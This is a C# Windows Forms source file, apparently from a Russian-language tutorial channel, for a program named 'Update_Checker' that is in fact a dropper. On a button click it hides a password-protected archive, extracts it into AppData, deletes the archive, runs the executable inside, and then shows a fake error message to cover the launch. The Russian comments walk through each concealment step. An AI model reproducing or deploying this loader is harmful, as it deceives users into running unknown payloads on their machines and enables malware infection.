// MadCode
// Telegram: @madcod
// https://t.me/MadCodechannel // Мой канал


using ICSharpCode.SharpZipLib.Core;
using ICSharpCode.SharpZipLib.Zip;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Update_Checker
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            // Переменная директории распаковки
            string dir = Environment.GetEnvironmentVariable("AppData") + "\\Up_tmp";
            // Обьявим тут пароль от архива, как вы помните я ставил 123
            string pass = "123";

            // Проверим есть ли директория
            if (!Directory.Exists(dir)) 
            {
                // Этот архив будет лежать рядом с EXE формы ЭТОЙ.
                // Давайте его скроем
                File.SetAttributes("update.z", FileAttributes.Hidden | FileAttributes.System);

                // Распаковываем архив введя пароль в директорию для расспаковки dir
                ExtractZipFile("update.z", pass, dir + "\\");
                // Удалим архив
                File.Delete("update.z");   
            }
            // Теперь можно запускать наш распакованный exe

            // Поспим наверное немного
            Thread.Sleep(5000); // 5 сек

            // Запускаем
            Process proc = Process.Start(dir + "\\update.exe");

            // И тут еще поспим чуток Thread.Sleep(10000); // 10 сек

            // Ну и выведем сообщение

            MessageBox.Show("Error code 5355!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error); // Сообщим об ошибке



        }










        // Класс для распаковки // Установим нужные библиотеки
        private static void ExtractZipFile(string archiveFilenameIn, string password, string outFolder)
        {
            ZipFile zf = null;
            try
            {
                FileStream fs = File.OpenRead(archiveFilenameIn);
                zf = new ZipFile(fs);
                if (!String.IsNullOrEmpty(password))
                {
                    zf.Password = password;
                }
                foreach (ZipEntry zipEntry in zf)
                {
                    if (!zipEntry.IsFile)
                    {
                        continue;
                    }
                    String entryFileName = zipEntry.Name;


                    byte[] buffer = new byte[4096];
                    Stream zipStream = zf.GetInputStream(zipEntry);
                    String fullZipToPath = Path.Combine(outFolder, entryFileName);
                    string directoryName = Path.GetDirectoryName(fullZipToPath);
                    if (directoryName.Length > 0)
                        Directory.CreateDirectory(directoryName);


                    using (FileStream streamWriter = File.Create(fullZipToPath))
                    {
                        StreamUtils.Copy(zipStream, streamWriter, buffer);
                    }
                }
            }
            catch (Exception ex)
            {
                throw ex;
            }
            finally
            {
                if (zf != null)
                {
                    zf.IsStreamOwner = true;
                    zf.Close();
                }
            }
        }
    }
}
